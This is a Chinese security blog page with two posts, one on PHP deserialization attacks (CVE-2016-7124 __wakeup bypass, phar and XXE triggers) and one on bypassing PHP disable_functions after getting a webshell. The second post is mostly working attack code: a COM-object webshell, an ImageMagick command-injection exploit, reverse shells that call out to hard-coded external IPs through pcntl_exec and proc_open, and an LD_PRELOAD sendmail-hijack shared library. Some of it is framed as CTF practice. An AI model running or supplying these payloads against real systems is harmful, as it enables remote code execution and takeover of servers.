      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">php反序列化</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-29 17:25:12" itemprop="dateCreated datePublished" datetime="2019-11-29T17:25:12+08:00">2019-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-07-27 17:18:51" itemprop="dateModified" datetime="2020-07-27T17:18:51+08:00">2020-07-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="反序列化漏洞-PHP-对象注入"><a href="#反序列化漏洞-PHP-对象注入" class="headerlink" title="反序列化漏洞   PHP 对象注入"></a>反序列化漏洞   PHP 对象注入</h4><p> 当 成 员 属 性 数 目 大 于 实 际 数 目 时 可 绕 过 wakeup方 法 (<strong>CVE-2016-7124</strong>)</p>
<p>O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3BN%3Bs%3A14%3A%22%00Name%00password%22%3BN%3B%7D<br>O%3A4%3A”Name”%3A3%3A%7Bs%3A14%3A”%00Name%00username”%3Bs%3A5%3A”admin”%3Bs%3A14%3A”%00Name%00password”%3Bi%3A100%3B%7D</p>
<p>我们将上面 <code>test=O:1:”A”:1:{s:1:”a”;s:18:”&lt;?php phpinfo ();?&gt;”;}</code> 中 A 的个数变成 2 或者大于 2 的数字如下：</p>
<blockquote>
<p><code>test=O:1:”A”:2:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}</code></p>
</blockquote>
<p>然后再次执行发现绕过了__wakeup 函数，成功将 phpinfo () 写入 hello.php</p>
<p> <strong>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。所以对象 A 和对象 B 序列化后并没有什么区别。</strong><br>unserialize () 函数能够重新把字符串变回 php 原来的值。 </p>
<p> 漏洞的根源在于 unserialize () 函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL 注入、目录遍历等等。 </p>
<h4 id="要实现phar反序列化攻击有几个条件"><a href="#要实现phar反序列化攻击有几个条件" class="headerlink" title="要实现phar反序列化攻击有几个条件"></a>要实现phar反序列化攻击有几个条件</h4><p>①有一个类有__destruct魔术方法作为跳板<br>②有file_exsits()等函数,且函数内容可控  file_exists ()、is_dir () 等）<br>③没有过滤phar://内容 </p>
<ol>
<li>phar 文件要能够上传到服务器端。</li>
</ol>
<p>xxe触发反序列化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!ENTITY hacker SYSTEM &quot;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;你上传的文件名&quot;&gt; ]&gt;  </span><br><span class="line">&lt;name&gt;&amp;hacker;&lt;&#x2F;name&gt;</span><br></pre></td></tr></table></figure>

<p>有序列化数据必然会有反序列化操作，php 一大部分的<a href="http://php.net/manual/en/ref.filesystem.php" target="_blank" rel="noopener">文件系统函数</a>在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：</p>
<p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt="img"></p>
<p> 当文件系统函数的参数可控时，我们可以在不调用 unserialize () 的情况下进行反序列化操作 </p>
<h4 id="php的反序列化意味着可以控制类的属性"><a href="#php的反序列化意味着可以控制类的属性" class="headerlink" title="php的反序列化意味着可以控制类的属性"></a>php的反序列化意味着可以控制类的属性</h4>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/29/rce/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/29/rce/" class="post-title-link" itemprop="url">rce</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-29 17:19:40" itemprop="dateCreated datePublished" datetime="2019-11-29T17:19:40+08:00">2019-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-07-31 18:49:19" itemprop="dateModified" datetime="2020-07-31T18:49:19+08:00">2020-07-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="根目录的-flag-无法读取"><a href="#根目录的-flag-无法读取" class="headerlink" title="根目录的 /flag 无法读取"></a>根目录的 /flag 无法读取</h3><p> /flag 是没有权限读取的，打过 CTF 的都知道，一般这个时候，根目录会留一个 /readflag 来让 ctfer 执行命令拿 flag，/readflag 会有一个 s 权限 <a href="http://www.361way.com/rh134-acl-chattr/4640.html" target="_blank" rel="noopener">Linux 文件权限与 ACL</a> </p>
<p> 环境变量 LD_preload + mail 劫持 so 来执行系统命令 </p>
<p>  <strong>webshell 居然无法执行系统命令，怀疑服务端 disable_functions 禁用了命令执行函数，通过环境变量 LD_PRELOAD 劫持系统函数，却又发现目标根本没安装 sendmail，无法执行命令 的 webshell 是无意义的，看我如何突破！</strong> </p>
<p> getshell 后我会先了解下该系统配置，虚拟终端中执行 cat /proc/meminfo 但执行报错： </p>
<p> <a href="https://image.3001.net/images/20181215/1544880208_5c150050dbc20.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880208_5c150050dbc20.png!small" alt="image.png"></a></p>
<p> 怀疑有 WAF 拦劫了待执行的命令，尝试了<strong>空字符串</strong>、<strong>路径扩展</strong>、<strong>自定义变量</strong>平时常用的几种绕命令执行限制的手法，结果都失败： </p>
<p><img src="/2019/11/29/rce/51.png" alt="51"></p>
<p>导致 webshell 不能执行命令的原因大概有三类：</p>
<p>一是 php.ini 中用 disable_functions 指示器禁用了 system ()、exec () 等等这类命令执行的相关函数；</p>
<p>二是 web 进程运行在 rbash 这类受限 shell 环境中；</p>
<p>三是 WAF 拦劫。若是一则无法执行任何命令，若是二、三则可以执行少量命令。从当前现象来看，很可能由 disable_functions 所致。 </p>
<p> 为验证，我利用前面的 RCE 漏洞执行 phpinfo ()，确认的确如此：</p>
<h3 id="有四种绕过-disable-functions-的手法："><a href="#有四种绕过-disable-functions-的手法：" class="headerlink" title="有四种绕过 disable_functions 的手法："></a>有四种绕过 disable_functions 的手法：</h3><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；</p>
<h5 id="系统组件绕过"><a href="#系统组件绕过" class="headerlink" title="系统组件绕过"></a>系统组件绕过</h5><p>window com组件(php 5.4)(高版本扩展要自己添加）<br>条件：要在php.ini中开启（如图）</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531163500-fad14268-837e-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531163500-fad14268-837e-1.png" alt="img"></a></p>
<p>利用代码，利用shell上传如下代码到目标服务器上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c &quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>利用成功后的结果<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531163853-8587f852-837f-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531163853-8587f852-837f-1.png" alt="img"></a></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h5 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h5><p>利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$command &#x3D; PHP_SAPI &#x3D;&#x3D; &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];</span><br><span class="line">if ($command &#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    $command &#x3D; &#39;id&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;example.com&#x2F;image.jpg&quot;|$command&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><br><span class="line">$thumb &#x3D; new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);</span><br><span class="line">$thumb-&gt;writeImage(&#39;KKKK.png&#39;);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(&quot;KKKK.mvg&quot;);</span><br><span class="line">unlink(&quot;KKKK.png&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>尝试第一种时，我用 phpinfo () 查看 ImageMagick 版本为 v6.9.4-10： </p>
<p>用 searchsploit（exploit-db.com 的本地版）搜索存在命令注入的版本为 v6.9.3-9 或 v7.0.1-0：</p>
<p><a href="https://image.3001.net/images/20181215/1544880268_5c15008ca5d03.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880268_5c15008ca5d03.png!small" alt="image.png"></a></p>
<p> 显然，当前 ImageMagick 无法利用 </p>
<h4 id="第二种，"><a href="#第二种，" class="headerlink" title="第二种，"></a>第二种，</h4><p>寻找未禁用的漏网函数，常见的执行命令的函数有 system ()、exec ()、shell_exec ()、passthru ()，偏僻的 popen ()、proc_open ()、pcntl_exec ()，逐一尝试，或许有漏网之鱼；</p>
<p> 尝试第二种时，常见的、不常见的、罕见的（如 dl ()），所有可启动进程的函数均被禁用； </p>
<h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h5><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5</p>
<p>利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  pcntl_exec(&quot;&#x2F;usr&#x2F;bin&#x2F;python&quot;,array(&#39;-c&#39;, &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;));?&gt;</span><br></pre></td></tr></table></figure>

<p>曾经就有一个网站是如此拿下的</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531171055-fedc768e-8383-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531171055-fedc768e-8383-1.png" alt="img"></a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531171152-212aeaf4-8384-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531171152-212aeaf4-8384-1.png" alt="img"></a></p>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h5 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h5><p>disable_function忘记添加proc_open，用curl带出来就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&amp;code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();"</span></span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'a'</span>:<span class="string">"""</span></span><br><span class="line"><span class="string">$descriptorspec=array(</span></span><br><span class="line"><span class="string">    0=&gt;array('pipe','r'), //STDIN</span></span><br><span class="line"><span class="string">    1=&gt;array('pipe','w'),//STDOUT</span></span><br><span class="line"><span class="string">    2=&gt;array('pipe','w') //STDERROR</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">$handle=proc_open('bash -c "bash -i &gt;&amp; /dev/tcp/122.152.230.160/2333 0&gt;&amp;1"',$descriptorspec,$pipes,NULL);</span></span><br><span class="line"><span class="string">var_dump($handle);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>&#125;).text</span><br></pre></td></tr></table></figure>



<h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><p>，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；</p>
<p> 尝试第三种时，发现并未启用 mod_cgi 模式。所有希望，寄托在 LD_PRELOAD。 </p>
<h4 id="第四种，php的putenv来设置LD-PRELOAD-劫持sendmail-既能绕过-open-basedir，又能绕过-disable-functions"><a href="#第四种，php的putenv来设置LD-PRELOAD-劫持sendmail-既能绕过-open-basedir，又能绕过-disable-functions" class="headerlink" title="第四种，php的putenv来设置LD_PRELOAD      劫持sendmail 既能绕过 open basedir，又能绕过 disable functions"></a>第四种，php的putenv来设置LD_PRELOAD      劫持sendmail 既能绕过 open basedir，又能绕过 disable functions</h4><p> 利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b ()，b () 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，我想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b () 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b () 而非系统的 c.so 内 b ()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP 函数、PHP 环境下劫持系统函数注入代码。 </p>
<p>查看进程调用系统函数明细。linux 创建新进程的过程较为复杂，我关心进程加载了哪些共享对象、可能调用哪些 API、实际调用了哪些 API。比如，运行 /usr/bin/id，通过 ldd 可查看系统为其加载的共享对象：</p>
<p><a href="https://image.3001.net/images/20181215/1544880281_5c15009921d27.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880281_5c15009921d27.png!small" alt="image.png"></a></p>
<p>由于可执行文件 /usr/bin/id 内含符号表，所以，运行 nm -D /usr/bin/id 2&gt;&amp;1 或 readelf -Ws /usr/bin/id 可查看该程序可能调用的系统 API 明细：</p>
<p><a href="https://image.3001.net/images/20181215/1544880287_5c15009f70c19.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880287_5c15009f70c19.png!small" alt="image.png"></a></p>
<h5 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式 (hijacking function)"></a>传统方式 (hijacking function)</h5><p>在已有的文章中显示，一般使用 php<code>mail()</code> 函数进行触发，我们简单分析一下</p>
<p>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 </p>
<p> php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的 </p>
<p>利用原理</p>
<p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<p>可能这个不好理解，我们做一个简单的测试代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">char passwd[] &#x3D; &quot;password&quot;;</span><br><span class="line">if (argc &lt; 2) &#123;</span><br><span class="line">        printf(&quot;usage: %s &lt;password&gt;&#x2F;n&quot;, argv[0]);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">if (!strcmp(passwd, argv[1])) &#123;</span><br><span class="line">        printf(&quot;Correct Password!&#x2F;n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Invalid Password!&#x2F;n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"># 保存为a.c，并编译为a</span><br></pre></td></tr></table></figure>

<p>保存如上代码为a.c，并编译为a,编译命令如下</p>
<blockquote>
<p>gcc a.c -o a</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">char passwd[] &#x3D; &quot;password&quot;;</span><br><span class="line">if (argc &lt; 2) &#123;</span><br><span class="line">        printf(&quot;usage: %s &lt;password&gt;&#x2F;n&quot;, argv[0]);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">if (!strcmp(passwd, argv[1])) &#123;</span><br><span class="line">        printf(&quot;Correct Password!&#x2F;n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Invalid Password!&#x2F;n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"># 保存为a.c，并编译为a</span><br></pre></td></tr></table></figure>

<p>保存如上代码为a.c，并编译为a,编译命令如下</p>
<blockquote>
<p>gcc a.c -o a</p>
</blockquote>
<p>运行a结果如下<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531165011-19a41c2c-8381-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531165011-19a41c2c-8381-1.png" alt="img"></a></p>
<p>以上程序很简单，根据判断传入的字符串是否等于”password”，得出两种不同结果。 其中用到了标准C函数strcmp函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数,代码如下(保存如下代码为b.c)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int strcmp(const char *s1, const char *s2)&#123;</span><br><span class="line">    printf(&quot;hack functio  n invoked. s1&#x3D;&lt;%s&gt; s2&#x3D;&lt;%s&gt;&#x2F;n&quot;, s1, s2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们编译以上代码为一个动态共享库，编译命令如下</p>
<blockquote>
<p>gcc -fPIC -shared b.c -o b.so</p>
</blockquote>
<p><strong>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载</strong></p>
<blockquote>
<p><strong>export LD_PRELOAD=”./b.so”</strong></p>
</blockquote>
<p>我们再次运行a<br>./a bbb<br>Correct Password!</p>
<p>我们看到随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。这也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持</p>
<h6 id="结合mail-函数进行实战测试"><a href="#结合mail-函数进行实战测试" class="headerlink" title="结合mail 函数进行实战测试"></a>结合mail 函数进行实战测试</h6><p>那么我们来看一下sendmail函数都调用了哪些库函数，使用<strong>readelf -Ws /usr/sbin/sendmail</strong>命令来查看，我们发现sendmail函数在运行过程动态调用了很多标准库函数：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531165654-09f5372e-8382-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531165654-09f5372e-8382-1.png" alt="img"></a></p>
<h6 id="构造poc思路"><a href="#构造poc思路" class="headerlink" title="构造poc思路"></a>构造poc思路</h6><p>编制我们自己的动态链接程序。 通过php的<strong>putenv</strong>来设置LD_PRELOAD，让我们的程序优先被调用。 在webshell上用mail函数发送一封邮件来触发。具体实现如下</p>
<p>1.编制我们自己的动态链接程序，代码如下（功能是执行mkdir test）<br>执行编译为一个动态共享库的命令如下</p>
<blockquote>
<p>gcc -c -fPIC a.c -o a<br>gcc -shared a -o a.so</p>
</blockquote>
<p>代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">         FILE*fp = fopen(<span class="string">"/tmp/2.txt"</span>,<span class="string">"w"</span>);</span><br><span class="line">         fclose(fp);</span><br><span class="line">         system(<span class="string">"mkdir /var/www/html/test"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span></span>&#123;</span><br><span class="line">  FILE *fp1=fopen(<span class="string">"/tmp/2.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span>(fp1!=<span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   fclose(fp1);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         payload();</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"ls / &gt; /tmp/sky"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.利用webshell，上传编译后的a.so到目标服务器<br>3.通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   putenv(&quot;LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.so&quot;);</span><br><span class="line">   mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class="line">  ?&gt;</span><br><span class="line">  </span><br><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">1. 制作一个恶意 shared libraries</span><br><span class="line">2. 使用 putenv 设置 LD_PRELOAD 为恶意文件路径</span><br><span class="line">3. 使用某个 php 函数，触发 specific shared library</span><br><span class="line">4. 成功进行 RCE</span><br></pre></td></tr></table></figure>

<p>结果如下，成功执行命令，创建文件test</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190531170751-91a13712-8383-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531170751-91a13712-8383-1.png" alt="img"></a></p>
